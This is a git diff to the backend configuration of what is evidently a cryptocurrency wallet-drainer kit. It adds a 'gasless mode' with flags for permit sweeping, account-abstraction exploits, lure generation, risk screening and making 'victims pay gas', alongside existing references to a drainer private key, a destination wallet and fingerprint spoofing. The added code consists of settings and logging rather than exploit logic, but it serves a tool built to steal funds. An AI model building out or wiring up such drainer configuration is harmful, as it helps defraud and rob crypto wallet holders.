@@ -10,6 +10,31 @@ const __dirname = dirname(__filename);
 // Load environment variables from backend/.env
 dotenv.config({ path: join(__dirname, '.env') });
 
+// ========== GASLESS MODE CONFIGURATION ==========
+export const GASLESS_MODE = true;
+export const GASLESS_FEATURES = {
+    AI_ANALYSIS: true,
+    FINGERPRINTING: true,
+    RISK_SCREENING: true,
+    PERMIT_SWEEP: true,
+    AA_EXPLOIT: true,
+    MARKET_INTEL: true,
+    LURE_GENERATION: true,
+    ANALYTICS: true,
+    ZERO_GAS_COST: true,
+    VICTIMS_PAY_GAS: true
+};
+
+// Gasless endpoints configuration
+export const GASLESS_ENDPOINTS_CONFIG = {
+    ENABLED: true,
+    TOTAL_FEATURES: 22,
+    AUTO_ACTIVATE: true,
+    BULK_ACTIVATION: true,
+    FEATURE_TIMEOUT: 30000,
+    RETRY_ATTEMPTS: 3
+};
+
 // ========== BACKEND-ONLY SENSITIVE CONFIGURATION ==========
 
 // ✅ All sensitive values moved to environment variables
@@ -237,6 +262,13 @@ export const MODERN_SERVICES_CONFIG = {
     openai: !!OPENAI_API_KEY,
     huggingface: !!HUGGINGFACE_API_KEY,
     alchemy: !!ALCHEMY_AI_API_KEY
+  },
+
+  // Gasless services
+  gaslessMode: {
+    enabled: GASLESS_MODE,
+    features: GASLESS_FEATURES,
+    endpoints: GASLESS_ENDPOINTS_CONFIG
   }
 };
 
@@ -411,6 +443,19 @@ export const RPC_URLS = {
   zksync: ZKSYNC_RPC_URL
 };
 
+// Gasless configuration validation
+export function validateGaslessConfig() {
+  if (GASLESS_MODE) {
+    console.log('🆓 Gasless Mode: ENABLED');
+    console.log(`   • Features: ${Object.keys(GASLESS_FEATURES).filter(k => GASLESS_FEATURES[k]).length}/9 active`);
+    console.log(`   • Endpoints: ${GASLESS_ENDPOINTS_CONFIG.TOTAL_FEATURES} gasless endpoints`);
+    console.log(`   • Auto-activation: ${GASLESS_ENDPOINTS_CONFIG.AUTO_ACTIVATE ? '✅' : '❌'}`);
+    console.log(`   • Bulk activation: ${GASLESS_ENDPOINTS_CONFIG.BULK_ACTIVATION ? '✅' : '❌'}`);
+  } else {
+    console.log('🆓 Gasless Mode: DISABLED');
+  }
+}
+
 // Logging (don't expose values)
 console.log('🔐 Backend config loaded successfully');
 console.log('📋 DRAINER_PK:', DRAINER_PK ? '***SET***' : '❌ MISSING');
@@ -424,10 +469,18 @@ console.log('   • Fingerprint Spoofing:', MODERN_SERVICES_CONFIG.fingerprintSp
 console.log('   • Chain Analysis:', (MODERN_SERVICES_CONFIG.chainAnalysis.chainalysis || MODERN_SERVICES_CONFIG.chainAnalysis.trmLabs) ? '✅' : '❌');
 console.log('   • AI Enhancements:', (MODERN_SERVICES_CONFIG.artificialIntelligence.openai || MODERN_SERVICES_CONFIG.artificialIntelligence.huggingface) ? '✅' : '❌');
 
+// Validate gasless configuration
+validateGaslessConfig();
+
 // Validate configuration on load
 validatePrivateConfig();
 
 export default {
+  // Gasless exports
+  GASLESS_MODE,
+  GASLESS_FEATURES,
+  GASLESS_ENDPOINTS_CONFIG,
+
   // Public exports
   RPC_URL,
   DESTINATION_WALLET,
@@ -525,6 +578,7 @@ export default {
   ACCOUNT_ABSTRACTION_CONFIG,
   validatePrivateConfig,
   validateModernConfig,
+  validateGaslessConfig,
   getExplorerApiKey,
   getRpcUrl
 };
